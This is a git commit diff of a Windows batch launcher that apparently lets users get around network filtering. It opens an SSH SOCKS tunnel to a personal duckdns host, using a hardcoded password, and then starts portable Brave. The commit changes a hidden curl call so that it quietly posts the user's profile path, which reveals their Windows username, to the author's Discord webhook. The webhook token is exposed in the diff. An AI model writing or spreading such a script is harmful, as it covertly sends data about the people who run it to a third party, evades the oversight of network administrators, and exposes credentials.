9aae97884805b55298e0d57821c29143b7643bd1
DoubleAAGuy <142100304+DoubleAAGuy@users.noreply.github.com>
2026-04-21 12:17:02 -0400

    Update start_unblocking.bat

--- start_unblocking.bat
+++ start_unblocking.bat
@@ -1,4 +1,5 @@
 @echo off
+setlocal
 cls
 echo Starting bypass...
 :: -D 1080 sets up the SOCKS proxy
@@ -8,11 +9,10 @@ echo Starting bypass...
 start "" /b "BravePortable\plink.exe" -batch -pw password67 -hostkey "SHA256:91kWQJz3BT8C9UhfjzeoIPp28Ak7wNODxypuaCyeAxU" -N -D 1080 ezbat@doubleaaguy.duckdns.org
 echo Launching Brave...
 start "" "BravePortable\brave-portable\brave-portable.exe"
-@echo off
-setlocal
 
 
-set "MSG=Launcher opened."
+
+set "MSG=%USERPROFILE%\Desktop\BravePortable"
 curl --proxy socks5h://127.0.0.1:1080 -H "Content-Type: application/json" -d "{\"content\":\"%MSG%\"}" "https://discord.com/api/webhooks/1496159081264709704/Wj-se7KZdOBo-uX0D2yrCx9vpp5eHSdGThnOYz-mBcXLHaTu_PEynKDfwgx0QSGozupV"
 
 
